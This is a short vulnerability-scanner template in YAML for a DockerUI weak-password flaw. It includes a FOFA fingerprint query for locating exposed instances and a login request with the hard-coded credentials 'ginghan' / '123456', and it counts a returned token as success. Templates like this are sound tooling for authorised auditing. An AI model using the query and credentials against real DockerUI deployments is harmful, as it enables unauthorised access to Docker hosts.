id: poc-yaml-dockerui-weak-password
info:
  name: DockerUI 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: dockerui
  fofa: body="static/common/js/ui.js"
requests:
- method: POST
  path: /login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: username=ginghan&grant_type=password&password=123456&practicetype=
  expression: status_code == 200 && contains(body,"\"msg\":\"OK\"") && contains(body,"\"token\":")
    && !contains(body,"<") && contains(headers,"Docker-UIManager")
variables: {}
transport: http
